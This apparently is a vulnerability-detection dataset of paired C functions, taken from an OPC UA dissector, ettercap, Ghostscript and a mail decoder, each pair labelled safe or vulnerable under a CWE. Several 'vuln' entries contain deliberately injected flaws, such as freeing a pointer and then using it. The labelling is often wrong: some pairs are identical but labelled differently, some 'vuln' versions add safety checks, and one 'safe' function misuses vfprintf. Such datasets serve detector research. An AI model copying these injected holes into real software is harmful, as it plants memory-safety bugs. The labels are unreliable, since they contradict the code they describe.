{"idx": "CWE-190-safe-1714284204039", "code": "void parseResultMask(proto_tree*tree, tvbuff_t*tvb, packet_info*pinfo _U_, gint*pOffset){static const int*browseresult_mask[]={&hf_opcua_resultMask_referencetype, &hf_opcua_resultMask_isforward, &hf_opcua_resultMask_nodeclass, &hf_opcua_resultMask_browsename, &hf_opcua_resultMask_displayname, &hf_opcua_resultMask_typedefinition, NULL};guint8 ResultMask=tvb_get_guint8(tvb, *pOffset);if(ResultMask==RESULTMASK_ALL){proto_tree_add_item(tree, hf_opcua_resultMask_all, tvb, *pOffset, 4, ENC_LITTLE_ENDIAN);}else{if(ResultMask!=0){proto_tree_add_bitmask(tree, tvb, *pOffset, hf_opcua_resultMask, ett_opcua_resultMask, browseresult_mask, ENC_LITTLE_ENDIAN);}else{*pOffset+=4;}}}", "target": 0}
{"idx": "CWE-190-vuln-1714284204039", "code": "void parseResultMask(proto_tree*tree, tvbuff_t*tvb, packet_info*pinfo _U_, gint*pOffset){static const int*browseresult_mask[]={&hf_opcua_resultMask_referencetype, &hf_opcua_resultMask_isforward, &hf_opcua_resultMask_nodeclass, &hf_opcua_resultMask_browsename, &hf_opcua_resultMask_displayname, &hf_opcua_resultMask_typedefinition, NULL};guint8 ResultMask=tvb_get_guint8(tvb, *pOffset);if(ResultMask == RESULTMASK_ALL){proto_tree_add_item(tree, hf_opcua_resultMask_all, tvb, *pOffset, 4, ENC_LITTLE_ENDIAN);}else{if(ResultMask != 0){proto_tree_add_bitmask(tree, tvb, *pOffset, hf_opcua_resultMask, ett_opcua_resultMask, browseresult_mask, ENC_LITTLE_ENDIAN);}else{if(*pOffset <= INT_MAX - 4){*pOffset+=4;}}}}", "target": 1}
{"idx": "CWE-125-safe-1714284218566", "code": "guint32 getExtensionObjectType(tvbuff_t*tvb, gint*pOffset){gint iOffset=*pOffset;guint8 EncodingMask;guint32 Numeric=0;EncodingMask=tvb_get_guint8(tvb, iOffset);iOffset++;switch(EncodingMask){case 0x00 : Numeric=tvb_get_guint8(tvb, iOffset);break;case 0x01 : iOffset+=1;Numeric=tvb_get_letohs(tvb, iOffset);break;case 0x02 : iOffset+=2;Numeric=tvb_get_letohl(tvb, iOffset);break;case 0x03 : case 0x04 : case 0x05 : case 0x06 : break;default: break;};return Numeric;}", "target": 0}
{"idx": "CWE-125-vuln-1714284218566", "code": "guint32 getExtensionObjectType(tvbuff_t*tvb, gint*pOffset){gint iOffset=*pOffset;guint8 EncodingMask;guint32 Numeric=0;EncodingMask=tvb_get_guint8(tvb, iOffset);iOffset++;switch(EncodingMask){case 0x00 : Numeric=tvb_get_guint8(tvb, iOffset);break;case 0x01 : iOffset+=1;Numeric=tvb_get_letohs(tvb, iOffset);break;case 0x02 : iOffset+=2;Numeric=tvb_get_letohl(tvb, iOffset);break;case 0x03 : case 0x04 : case 0x05 : case 0x06 : break;default: break;};if(iOffset < tvb_reported_length(tvb)){Numeric=tvb_get_guint8(tvb, iOffset);}return Numeric;}", "target": 1}
{"idx": "CWE-1341-safe-1714284231682", "code": "void ef_debug(u_char level, const char* message, ...){ va_list ap; if (EF_GBL_OPTIONS->debug < level) return; va_start(ap, message); vfprintf(stderr, \"%s\", ap); fflush(stderr); va_end(ap); }", "target": 0}
{"idx": "CWE-1341-vuln-1714284231682", "code": "void ef_debug(u_char level, const char*message, ...){va_list ap;if(EF_GBL_OPTIONS->debug<level)return;va_start(ap, message);vfprintf(stderr, \"%s\", ap);va_end(ap);fflush(stderr);va_end(ap);}", "target": 1}
{"idx": "CWE-22-safe-1714284236895", "code": "int main(int argc, char*argv[]){int ret_value=0;libettercap_init();ef_globals_alloc();select_text_interface();libettercap_ui_init();fprintf(stdout, \"\\n\" EC_COLOR_BOLD \"%s%s\" EC_COLOR_END \" copyright%s%s\\n\\n\", PROGRAM, EC_VERSION, EC_COPYRIGHT, EC_AUTHORS);EF_GBL->lineno=1;parse_options(argc, argv);if(EF_GBL_OPTIONS->source_file){if(strstr(EF_GBL_OPTIONS->source_file, \"../\")){FATAL_ERROR(\"Invalid source file path!\");}yyin=fopen(EF_GBL_OPTIONS->source_file, \"r\");if(yyin == NULL)FATAL_ERROR(\"Input file not found!\");}else{FATAL_ERROR(\"No source file.\");}if(EF_GBL_OPTIONS->output_file){if(strstr(EF_GBL_OPTIONS->output_file, \"../\")){FATAL_ERROR(\"Invalid output file path!\");}}setbuf(yyin, NULL);setbuf(stdout, NULL);setbuf(stderr, NULL);load_tables();load_constants();fprintf(stdout, \"\\n Parsing source file '%s' \", EF_GBL_OPTIONS->source_file);fflush(stdout);ef_debug(1, \"\\n\");if(yyparse() == 0)fprintf(stdout, \" done.\\n\\n\");else fprintf(stdout, \"\\n\\nThe script contains errors...\\n\\n\");ret_value=write_output();if(ret_value == -E_NOTHANDLED)FATAL_ERROR(\"Cannot write output file(%s): the filter is not correctly handled.\", EF_GBL_OPTIONS->output_file);else if(ret_value == -E_INVALID)FATAL_ERROR(\"Cannot write output file(%s): the filter format is not correct. \", EF_GBL_OPTIONS->output_file);ef_globals_free();return 0;}", "target": 0}
{"idx": "CWE-22-vuln-1714284236895", "code": "int main(int argc, char*argv[]){int ret_value=0;libettercap_init();ef_globals_alloc();select_text_interface();libettercap_ui_init();fprintf(stdout, \"\\n\" EC_COLOR_BOLD \"%s%s\" EC_COLOR_END \" copyright%s%s\\n\\n\", PROGRAM, EC_VERSION, EC_COPYRIGHT, EC_AUTHORS);EF_GBL->lineno=1;parse_options(argc, argv);if(EF_GBL_OPTIONS->source_file){if(strstr(EF_GBL_OPTIONS->source_file, \"../\")){FATAL_ERROR(\"Invalid source file path!\");}yyin=fopen(EF_GBL_OPTIONS->source_file, \"r\");if(yyin == NULL)FATAL_ERROR(\"Input file not found!\");}else{FATAL_ERROR(\"No source file.\");}if(EF_GBL_OPTIONS->output_file){if(strstr(EF_GBL_OPTIONS->output_file, \"../\")){FATAL_ERROR(\"Invalid output file path!\");}}setbuf(yyin, NULL);setbuf(stdout, NULL);setbuf(stderr, NULL);load_tables();load_constants();fprintf(stdout, \"\\n Parsing source file '%s' \", EF_GBL_OPTIONS->source_file);fflush(stdout);ef_debug(1, \"\\n\");if(yyparse() == 0)fprintf(stdout, \" done.\\n\\n\");else fprintf(stdout, \"\\n\\nThe script contains errors...\\n\\n\");ret_value=write_output();if(ret_value == -E_NOTHANDLED)FATAL_ERROR(\"Cannot write output file(%s): the filter is not correctly handled.\", EF_GBL_OPTIONS->output_file);else if(ret_value == -E_INVALID)FATAL_ERROR(\"Cannot write output file(%s): the filter format is not correct. \", EF_GBL_OPTIONS->output_file);ef_globals_free();return 0;}", "target": 1}
{"idx": "CWE-119-safe-1714284318818", "code": "static size_t add_data_segment(u_char**data, size_t base, u_char**string, size_t slen){SAFE_REALLOC(*data, base+slen);memcpy(*data+base, *string, slen);*string=(u_char*)base;return slen;}", "target": 0}
{"idx": "CWE-119-vuln-1714284318818", "code": "static size_t add_data_segment(u_char**data, size_t base, u_char**string, size_t slen){SAFE_REALLOC(*data, base+slen);if (slen > SIZE_MAX - base) {return 0;}memcpy(*data+base, *string, slen);*string=(u_char*)base;return slen;}", "target": 1}
{"idx": "CWE-190-safe-1714284323367", "code": "int write_output(void){int fd;struct filter_op*fop;struct filter_header fh;size_t ninst, i;u_char*data;ninst=compile_tree(&fop);if(fop == NULL)return-E_NOTHANDLED;if(ninst == 0)return-E_INVALID;fd=open(EF_GBL_OPTIONS->output_file, O_CREAT|O_RDWR|O_TRUNC|O_BINARY, 0644);ON_ERROR(fd, -1, \"Can't create file%s\" , EF_GBL_OPTIONS->output_file);fprintf(stdout, \" Writing output to '%s' \" , EF_GBL_OPTIONS->output_file);fflush(stdout);fh . magic=htons(EC_FILTER_MAGIC);snprintf(fh . version, sizeof(fh . version), \"%s\", EC_VERSION);fh . data=sizeof(fh);data=create_data_segment(&fh, fop, ninst);write(fd, &fh, sizeof(struct filter_header));write(fd, data, fh . code-fh . data);for(i=0;i <= ninst;i++){print_progress_bar(&fop [ i ]);write(fd, &fop [ i ], sizeof(struct filter_op));}close(fd);fprintf(stdout, \" done.\\n\\n\" );fprintf(stdout, \"->Script encoded into%d instructions.\\n\\n\" , (int)(i-1));return E_SUCCESS;}", "target": 0}
{"idx": "CWE-190-vuln-1714284323367", "code": "int write_output(void){int fd;struct filter_op*fop;struct filter_header fh;size_t ninst, i;u_char*data;ninst=compile_tree(&fop);if(fop == NULL)return-E_NOTHANDLED;if(ninst == 0)return-E_INVALID;fd=open(EF_GBL_OPTIONS->output_file, O_CREAT|O_RDWR|O_TRUNC|O_BINARY, 0644);ON_ERROR(fd, -1, \"Can't create file%s\" , EF_GBL_OPTIONS->output_file);fprintf(stdout, \" Writing output to '%s' \" , EF_GBL_OPTIONS->output_file);fflush(stdout);fh . magic=htons(EC_FILTER_MAGIC);snprintf(fh . version, sizeof(fh . version), \"%s\", EC_VERSION);fh . data=sizeof(fh);data=create_data_segment(&fh, fop, ninst);write(fd, &fh, sizeof(struct filter_header));write(fd, data, fh . code-fh . data);for(i=0;i < ninst + 1;i++){print_progress_bar(&fop [ i ]);write(fd, &fop [ i ], sizeof(struct filter_op));}close(fd);fprintf(stdout, \" done.\\n\\n\" );fprintf(stdout, \"->Script encoded into%d instructions.\\n\\n\" , (int)(i-1));return E_SUCCESS;}", "target": 1}
{"idx": "CWE-416-safe-1714284337279", "code": "struct block*compiler_add_ifblk(struct ifblock*ifb, struct block*blk){struct block*bl;SAFE_CALLOC(bl, 1, sizeof(struct block));bl->type=BLK_IFBLK;if(bl){bl->un.ifb=ifb;}bl->next=blk;return bl;}", "target": 0}
{"idx": "CWE-416-vuln-1714284337279", "code": "struct block*compiler_add_ifblk(struct ifblock*ifb, struct block*blk){struct block*bl;SAFE_CALLOC(bl, 1, sizeof(struct block));bl->type=BLK_IFBLK;if(bl){bl->un.ifb=ifb;}free(blk);bl->next=blk;return bl;}", "target": 1}
{"idx": "CWE-416-safe-1714284344748", "code": "struct block*compiler_add_instr(struct instruction*ins, struct block*blk){struct block*bl;SAFE_CALLOC(bl, 1, sizeof(struct block));bl->type=BLK_INSTR;bl->un.ins=ins;bl->next=blk;free(blk);return bl;}", "target": 0}
{"idx": "CWE-416-vuln-1714284344748", "code": "struct block*compiler_add_instr(struct instruction*ins, struct block*blk){struct block*bl;SAFE_CALLOC(bl, 1, sizeof(struct block));bl->type=BLK_INSTR;bl->un.ins=ins;bl->next=blk;free(blk);blk->type=BLK_INSTR;return bl;}", "target": 1}
{"idx": "CWE-416-safe-1714284349548", "code": "static void unfold_conds(struct condition*cnd, u_int32 a, u_int32 b){struct unfold_elm*ue=NULL;do{ef_debug(1, \"?\" );SAFE_CALLOC(ue, 1, sizeof(struct unfold_elm));memcpy(&ue->fop, &cnd->fop, sizeof(struct filter_op));TAILQ_INSERT_TAIL(&unfolded_tree, ue, next);if(cnd->op == COND_OR){ue->fop . opcode=FOP_JTRUE;ue->fop . op . jmp=a;}else{ue->fop . opcode=FOP_JFALSE;ue->fop . op . jmp=b;}TAILQ_INSERT_TAIL(&unfolded_tree, ue, next);}while((cnd=cnd->next));}", "target": 0}
{"idx": "CWE-416-vuln-1714284349548", "code": "static void unfold_conds(struct condition*cnd, u_int32 a, u_int32 b){struct unfold_elm*ue=NULL;do{ef_debug(1, \"?\" );SAFE_CALLOC(ue, 1, sizeof(struct unfold_elm));memcpy(&ue->fop, &cnd->fop, sizeof(struct filter_op));TAILQ_INSERT_TAIL(&unfolded_tree, ue, next);if(cnd->op == COND_OR){ue->fop . opcode=FOP_JTRUE;ue->fop . op . jmp=a;}else{ue->fop . opcode=FOP_JFALSE;ue->fop . op . jmp=b;}TAILQ_INSERT_TAIL(&unfolded_tree, ue, next);free(ue);}while((cnd=cnd->next));}", "target": 1}
{"idx": "CWE-416-safe-1714284356747", "code": "static void unfold_ifblk(struct block**blk){if(blk == NULL || *blk == NULL) return;struct ifblock*ifblk;struct unfold_elm*ue;u_int32 a=vlabel++;u_int32 b=vlabel++;u_int32 c=vlabel++;ef_debug(1, \"#\" );ifblk=(*blk)->un . ifb;unfold_conds(ifblk->conds, a, b);SAFE_CALLOC(ue, 1, sizeof(struct unfold_elm));ue->label=a;TAILQ_INSERT_TAIL(&unfolded_tree, ue, next);if(ifblk->blk != NULL){unfold_blk(&ifblk->blk);}if(ifblk->elseblk != NULL){SAFE_CALLOC(ue, 1, sizeof(struct unfold_elm));ue->fop . opcode=FOP_JMP;ue->fop . op . jmp=c;TAILQ_INSERT_TAIL(&unfolded_tree, ue, next);}SAFE_CALLOC(ue, 1, sizeof(struct unfold_elm));ue->label=b;TAILQ_INSERT_TAIL(&unfolded_tree, ue, next);if(ifblk->elseblk != NULL){unfold_blk(&ifblk->elseblk);SAFE_CALLOC(ue, 1, sizeof(struct unfold_elm));ue->label=c;TAILQ_INSERT_TAIL(&unfolded_tree, ue, next);}}", "target": 0}
{"idx": "CWE-416-vuln-1714284356747", "code": "static void unfold_ifblk(struct block**blk){if(blk == NULL || *blk == NULL)return;struct ifblock*ifblk;struct unfold_elm*ue;u_int32 a=vlabel++;u_int32 b=vlabel++;u_int32 c=vlabel++;ef_debug(1, \"#\" );ifblk=(*blk)->un . ifb;unfold_conds(ifblk->conds, a, b);SAFE_CALLOC(ue, 1, sizeof(struct unfold_elm));ue->label=a;TAILQ_INSERT_TAIL(&unfolded_tree, ue, next);if(ifblk->blk != NULL){unfold_blk(&ifblk->blk);}if(ifblk->elseblk != NULL){SAFE_CALLOC(ue, 1, sizeof(struct unfold_elm));ue->fop . opcode=FOP_JMP;ue->fop . op . jmp=c;TAILQ_INSERT_TAIL(&unfolded_tree, ue, next);}SAFE_CALLOC(ue, 1, sizeof(struct unfold_elm));ue->label=b;TAILQ_INSERT_TAIL(&unfolded_tree, ue, next);free(ifblk);if(ifblk->elseblk != NULL){unfold_blk(&ifblk->elseblk);SAFE_CALLOC(ue, 1, sizeof(struct unfold_elm));ue->label=c;TAILQ_INSERT_TAIL(&unfolded_tree, ue, next);}}", "target": 1}
{"idx": "CWE-122-safe-1714284370252", "code": "size_t compile_tree(struct filter_op**fop){int i=0;struct filter_op*array=NULL;struct unfold_elm*ue;if(tree_root == NULL)return 0;fprintf(stdout, \" Unfolding the meta-tree \" );fflush(stdout);unfold_blk(&tree_root);fprintf(stdout, \" done.\\n\\n\" );labels_to_offsets();TAILQ_FOREACH(ue, &unfolded_tree, next){if(ue->label == 0){SAFE_REALLOC(array, (i+1)*sizeof(struct filter_op));memcpy(&array[i], &ue->fop, sizeof(struct filter_op));i++;}}SAFE_REALLOC(array, (i+1)*sizeof(struct filter_op));array[i].opcode=FOP_EXIT;*fop=array;return(i+1);}", "target": 0}
{"idx": "CWE-122-vuln-1714284370252", "code": "size_t compile_tree(struct filter_op**fop){int i=0;struct filter_op*array=NULL;struct unfold_elm*ue;if(tree_root == NULL)return 0;fprintf(stdout, \" Unfolding the meta-tree \" );fflush(stdout);unfold_blk(&tree_root);fprintf(stdout, \" done.\\n\\n\" );labels_to_offsets();TAILQ_FOREACH(ue, &unfolded_tree, next){if(ue->label == 0){SAFE_REALLOC(array, (i+1)*sizeof(struct filter_op));memcpy(&array[i], &ue->fop, sizeof(struct filter_op));i++;}}SAFE_REALLOC(array, (i+1)*sizeof(struct filter_op));array[i].opcode=FOP_EXIT;*fop=array;return(i+1);}", "target": 1}
{"idx": "CWE-20-safe-1714284382297", "code": "static int dict_threshold_common_params(const ref*pdict, gs_threshold_halftone_common*ptp, ref**pptstring, ref*ptproc){int code;check_dict_read(*pdict);if((code=dict_int_param(pdict, \"Width\" , 1, 0x7fff, -1, &ptp->width))<0 || (code=dict_int_param(pdict, \"Height\" , 1, 0x7fff, -1, &ptp->height))<0 || (code=dict_find_string(pdict, \"Thresholds\" , pptstring)) <= 0 || (code=dict_proc_param(pdict, \"TransferFunction\" , ptproc, false))<0)return(code<0 ? code : gs_error_undefined);if(ptp->width < 0 || ptp->height < 0) return gs_error_rangecheck;ptp->transfer_closure . proc=0;ptp->transfer_closure . data=0;return code;}", "target": 0}
{"idx": "CWE-20-vuln-1714284382297", "code": "static int dict_threshold_common_params(const ref*pdict, gs_threshold_halftone_common*ptp, ref**pptstring, ref*ptproc){int code;check_dict_read(*pdict);if((code=dict_int_param(pdict, \"Width\" , 1, 0x7fff, -1, &ptp->width))<0 || (code=dict_int_param(pdict, \"Height\" , 1, 0x7fff, -1, &ptp->height))<0 || (pptstring == NULL || (code=dict_find_string(pdict, \"Thresholds\" , pptstring)) <= 0) || (code=dict_proc_param(pdict, \"TransferFunction\" , ptproc, false))<0)return(code<0 ? code : gs_error_undefined);if(ptp->width<0 || ptp->height<0)return gs_error_rangecheck;ptp->transfer_closure . proc=0;ptp->transfer_closure . data=0;return code;}", "target": 1}
{"idx": "CWE-416-safe-1714284390669", "code": "static int dict_spot_params(const ref*pdict, gs_spot_halftone*psp, ref*psproc, ref*ptproc, gs_memory_t*mem){int code;check_dict_read(*pdict);if((code=dict_float_param(pdict, \"Frequency\" , 0.0, &psp->screen . frequency)) != 0 || (code=dict_float_param(pdict, \"Angle\" , 0.0, &psp->screen . angle)) != 0 || (code=dict_proc_param(pdict, \"SpotFunction\" , psproc, false)) != 0 || (code=dict_bool_param(pdict, \"AccurateScreens\" , gs_currentaccuratescreens(mem), &psp->accurate_screens))<0 || (code=dict_proc_param(pdict, \"TransferFunction\" , ptproc, false))<0)return(code<0 ? code : gs_error_undefined);psp->transfer=(code>0 ?(gs_mapping_proc)0 : gs_mapped_transfer);psp->transfer_closure . proc=0;psp->transfer_closure . data=0;return 0;}", "target": 0}
{"idx": "CWE-416-vuln-1714284390669", "code": "static int dict_spot_params(const ref*pdict, gs_spot_halftone*psp, ref*psproc, ref*ptproc, gs_memory_t*mem){int code;check_dict_read(*pdict);if((code=dict_float_param(pdict, \"Frequency\" , 0.0, &psp->screen . frequency)) != 0 || (code=dict_float_param(pdict, \"Angle\" , 0.0, &psp->screen . angle)) != 0 || (code=dict_proc_param(pdict, \"SpotFunction\" , psproc, false)) != 0 || (code=dict_bool_param(pdict, \"AccurateScreens\" , gs_currentaccuratescreens(mem), &psp->accurate_screens))<0 || (code=dict_proc_param(pdict, \"TransferFunction\" , ptproc, false))<0)return(code<0 ? code : gs_error_undefined);psp->transfer=(code>0 ?(gs_mapping_proc)0 : gs_mapped_transfer);psp->transfer_closure . proc=0;psp->transfer_closure . data=0;return 0;}", "target": 1}
{"idx": "CWE-416-safe-1714284449370", "code": "int gs_get_colorname_string(const gs_memory_t*mem, gs_separation_name colorname_index, unsigned char**ppstr, unsigned int*pname_size){if(!mem || !ppstr || !pname_size) return -1;ref nref;name_index_ref(mem, colorname_index, &nref);name_string_ref(mem, &nref, &nref);return obj_string_data(mem, &nref, (const unsigned char**)ppstr, pname_size); }", "target": 0}
{"idx": "CWE-416-vuln-1714284449370", "code": "int gs_get_colorname_string(const gs_memory_t*mem, gs_separation_name colorname_index, unsigned char**ppstr, unsigned int*pname_size){if(!mem || !ppstr || !pname_size)return-1;ref nref;name_index_ref(mem, colorname_index, &nref);name_string_ref(mem, &nref, &nref);gs_free_object(mem, &nref);return obj_string_data(mem, &nref, (const unsigned char**)ppstr, pname_size);}", "target": 1}
{"idx": "CWE-416-safe-1714284456551", "code": "static int dict_real_result(i_ctx_t*i_ctx_p, ref*pdict, const char*kstr, double val){int code=0;ref*ignore;if(dict_find_string(pdict, kstr, &ignore)>0){ref rval;check_dict_write(*pdict);make_real(&rval, val);code=idict_put_string(pdict, kstr, &rval);}return code;}", "target": 0}
{"idx": "CWE-416-vuln-1714284456551", "code": "static int dict_real_result(i_ctx_t*i_ctx_p, ref*pdict, const char*kstr, double val){int code=0;ref*ignore;if(dict_find_string(pdict, kstr, &ignore)>0){ref rval;check_dict_write(*pdict);make_real(&rval, val);code=idict_put_string(pdict, kstr, &rval);}if(ignore){gs_free_object(i_ctx_p, ignore, \"dict_real_result\");}return code;}", "target": 1}
{"idx": "CWE-476-safe-1714284516347", "code": "static int sethalftone_finish(i_ctx_t*i_ctx_p){gx_device_halftone*pdht=r_ptr(esp, gx_device_halftone);int code;if(pdht->components && pdht->components[0].corder){pdht->order=pdht->components[0].corder;}code=gx_ht_install(igs, r_ptr(esp-1, gs_halftone), pdht);if(code<0){return code;}istate->halftone=esp[-2];esp-=4;sethalftone_cleanup(i_ctx_p);return o_pop_estack;}", "target": 0}
{"idx": "CWE-476-vuln-1714284516347", "code": "static int sethalftone_finish(i_ctx_t*i_ctx_p){gx_device_halftone*pdht=r_ptr(esp, gx_device_halftone);int code;if(pdht && pdht->components && pdht->components[0].corder){pdht->order=pdht->components[0].corder;}code=gx_ht_install(igs, r_ptr(esp-1, gs_halftone), pdht);if(code<0){return code;}istate->halftone=esp[-2];esp-=4;sethalftone_cleanup(i_ctx_p);return o_pop_estack;}", "target": 1}
{"idx": "CWE-416-safe-1714284528990", "code": "void message_decoder_set_return_binary(struct message_decoder_context*ctx, bool set){if(set){ctx->flags|=MESSAGE_DECODER_FLAG_RETURN_BINARY;}else{ctx->flags&=~ MESSAGE_DECODER_FLAG_RETURN_BINARY;}message_decode_body_init_charset(ctx, ctx->prev_part);}", "target": 0}
{"idx": "CWE-416-vuln-1714284528990", "code": "void message_decoder_set_return_binary(struct message_decoder_context*ctx, bool set){if(set){free(ctx);ctx->flags|=MESSAGE_DECODER_FLAG_RETURN_BINARY;}else{ctx->flags&=~ MESSAGE_DECODER_FLAG_RETURN_BINARY;}message_decode_body_init_charset(ctx, ctx->prev_part);}", "target": 1}
{"idx": "CWE-20-safe-1714284534574", "code": "static bool message_decode_header(struct message_decoder_context* ctx, struct message_header_line* hdr, struct message_block* output) {\n    size_t value_len;\n    if (hdr->continues) {\n        hdr->use_full_value = TRUE;\n        return FALSE;\n    }\n    T_BEGIN {\n        if (hdr->name_len == 12 && strcasecmp(hdr->name, \"Content-Type\") == 0) {\n            parse_content_type(ctx, hdr);\n        }\n        if (hdr->name_len == 25 && strcasecmp(hdr->name, \"Content-Transfer-Encoding\") == 0) {\n            ctx->message_cte = message_decoder_parse_cte(hdr);\n        }\n    } T_END;\n    buffer_set_used_size(ctx->buf, 0);\n    message_header_decode_utf8(hdr->full_value, hdr->full_value_len, ctx->buf, ctx->normalizer);\n    value_len = ctx->buf->used;\n    if (ctx->normalizer != NULL) {\n        (void)ctx->normalizer(hdr->name, hdr->name_len, ctx->buf);\n        buffer_append_c(ctx->buf, '\\0');\n    } else {\n        if (!uni_utf8_get_valid_data((const unsigned char*)hdr->name, hdr->name_len, ctx->buf)) {\n            buffer_append_c(ctx->buf, '\\0');\n        }\n    }\n    ctx->hdr = *hdr;\n    ctx->hdr.full_value = ctx->buf->data;\n    ctx->hdr.full_value_len = value_len;\n    ctx->hdr.value_len = 0;\n    if (ctx->buf->used != value_len) {\n        if (ctx->buf->used - 1 - value_len > 0) {\n            ctx->hdr.name = CONST_PTR_OFFSET(ctx->buf->data, ctx->hdr.full_value_len);\n            ctx->hdr.name_len = ctx->buf->used - 1 - value_len;\n        }\n    }\n    output->hdr = &ctx->hdr;\n    return TRUE;\n}", "target": 0}
{"idx": "CWE-20-vuln-1714284534574", "code": "static bool message_decode_header(struct message_decoder_context*ctx, struct message_header_line*hdr, struct message_block*output){size_t value_len;if(hdr == NULL){return FALSE;}if(hdr->continues){hdr->use_full_value=TRUE;return FALSE;}T_BEGIN{if(hdr->name_len == 12 && strcasecmp(hdr->name, \"Content-Type\") == 0){parse_content_type(ctx, hdr);}if(hdr->name_len == 25 && strcasecmp(hdr->name, \"Content-Transfer-Encoding\") == 0){ctx->message_cte=message_decoder_parse_cte(hdr);}}T_END;buffer_set_used_size(ctx->buf, 0);message_header_decode_utf8(hdr->full_value, hdr->full_value_len, ctx->buf, ctx->normalizer);value_len=ctx->buf->used;if(ctx->normalizer != NULL){(void)ctx->normalizer(hdr->name, hdr->name_len, ctx->buf);buffer_append_c(ctx->buf, '\\0');}else{if(!uni_utf8_get_valid_data((const unsigned char*)hdr->name, hdr->name_len, ctx->buf)){buffer_append_c(ctx->buf, '\\0');}}ctx->hdr=*hdr;ctx->hdr.full_value=ctx->buf->data;ctx->hdr.full_value_len=value_len;ctx->hdr.value_len=0;if(ctx->buf->used != value_len){if(ctx->buf->used-1-value_len>0){ctx->hdr.name=CONST_PTR_OFFSET(ctx->buf->data, ctx->hdr.full_value_len);ctx->hdr.name_len=ctx->buf->used-1-value_len;}}output->hdr=&ctx->hdr;return TRUE;}", "target": 1}
{"idx": "CWE-416-safe-1714284550310", "code": "void message_decoder_decode_reset(struct message_decoder_context*ctx){if(!ctx) return;const char*error;if(ctx->qp != NULL)(void)qp_decoder_finish(ctx->qp, &error);i_free_and_null(ctx->content_type);i_free_and_null(ctx->content_charset);ctx->message_cte=MESSAGE_CTE_78BIT;buffer_set_used_size(ctx->encoding_buf, 0);}", "target": 0}
{"idx": "CWE-416-vuln-1714284550310", "code": "void message_decoder_decode_reset(struct message_decoder_context*ctx){if(!ctx)return;const char*error;if(ctx->qp != NULL)(void)qp_decoder_finish(ctx->qp, &error);i_free_and_null(ctx->content_type);ctx->content_type=NULL;i_free_and_null(ctx->content_charset);ctx->message_cte=MESSAGE_CTE_78BIT;buffer_set_used_size(ctx->encoding_buf, 0);}", "target": 1}
{"idx": "CWE-416-safe-1714284556733", "code": "enum message_cte message_decoder_parse_cte(struct message_header_line* hdr){\n    struct rfc822_parser_context parser;\n    enum message_cte message_cte;\n    string_t* value;\n    value = t_str_new(hdr->full_value_len);\n    rfc822_parser_init(&parser, hdr->full_value, hdr->full_value_len, NULL);\n    rfc822_skip_lwsp(&parser);\n    (void)rfc822_parse_mime_token(&parser, value);\n    message_cte = MESSAGE_CTE_UNKNOWN;\n    switch(str_len(value)){\n        case 4 :\n            if(i_memcasecmp(str_data(value), \"7bit\", 4) == 0 || i_memcasecmp(str_data(value), \"8bit\", 4) == 0)\n                message_cte = MESSAGE_CTE_78BIT;\n            break;\n        case 6 :\n            if(i_memcasecmp(str_data(value), \"base64\", 6) == 0)\n                message_cte = MESSAGE_CTE_BASE64;\n            else if(i_memcasecmp(str_data(value), \"binary\", 6) == 0)\n                message_cte = MESSAGE_CTE_BINARY;\n            break;\n        case 16 :\n            if(i_memcasecmp(str_data(value), \"quoted-printable\", 16) == 0)\n                message_cte = MESSAGE_CTE_QP;\n            break;\n    }\n    rfc822_parser_deinit(&parser);\n    return message_cte;\n}", "target": 0}
{"idx": "CWE-416-vuln-1714284556733", "code": "enum message_cte message_decoder_parse_cte(struct message_header_line* hdr) {\n    struct rfc822_parser_context parser;\n    enum message_cte message_cte;\n    string_t* value;\n    value = t_str_new(hdr->full_value_len);\n    rfc822_parser_init(&parser, hdr->full_value, hdr->full_value_len, NULL);\n    rfc822_skip_lwsp(&parser);\n    (void)rfc822_parse_mime_token(&parser, value);\n    message_cte = MESSAGE_CTE_UNKNOWN;\n    switch (str_len(value)) {\n        case 4 :\n            if (i_memcasecmp(str_data(value), \"7bit\", 4) == 0 || i_memcasecmp(str_data(value), \"8bit\", 4) == 0)\n                message_cte = MESSAGE_CTE_78BIT;\n            break;\n        case 6 :\n            if (i_memcasecmp(str_data(value), \"base64\", 6) == 0)\n                message_cte = MESSAGE_CTE_BASE64;\n            else if (i_memcasecmp(str_data(value), \"binary\", 6) == 0)\n                message_cte = MESSAGE_CTE_BINARY;\n            break;\n        case 16 :\n            if (i_memcasecmp(str_data(value), \"quoted-printable\", 16) == 0)\n                message_cte = MESSAGE_CTE_QP;\n            break;\n    }\n    rfc822_parser_deinit(&parser);\n    \n    str_free(&value);\n    return message_cte;\n}", "target": 1}
{"idx": "CWE-416-safe-1714284573816", "code": "static void fts_parser_script_more(struct fts_parser*_parser, struct message_block*block){struct script_fts_parser*parser=(struct script_fts_parser*)_parser;ssize_t ret;if(block->size>0){if(!parser->failed && write_full(parser->fd, block->data, block->size)<0){i_error(\"write(%s)failed:%m\" , parser->path);parser->failed=TRUE;}block->size=0;}else{if(!parser->shutdown){if(shutdown(parser->fd, SHUT_WR)<0)i_error(\"shutdown(%s)failed:%m\" , parser->path);parser->shutdown=TRUE;}ret=read(parser->fd, parser->outbuf, sizeof(parser->outbuf));if(ret<0)i_error(\"read(%s)failed:%m\" , parser->path);else{block->data=parser->outbuf;block->size=ret;}}}", "target": 0}
{"idx": "CWE-416-vuln-1714284573816", "code": "static void fts_parser_script_more(struct fts_parser*_parser, struct message_block*block){struct script_fts_parser*parser=(struct script_fts_parser*)_parser;ssize_t ret;if(block->size>0){if(!parser->failed && write_full(parser->fd, block->data, block->size)<0){i_error(\"write(%s)failed:%m\" , parser->path);parser->failed=TRUE;}free(block->data);block->data=NULL;block->size=0;}else{if(!parser->shutdown){if(shutdown(parser->fd, SHUT_WR)<0)i_error(\"shutdown(%s)failed:%m\" , parser->path);parser->shutdown=TRUE;}ret=read(parser->fd, parser->outbuf, sizeof(parser->outbuf));if(ret<0)i_error(\"read(%s)failed:%m\" , parser->path);else{block->data=parser->outbuf;block->size=ret;}}}", "target": 1}
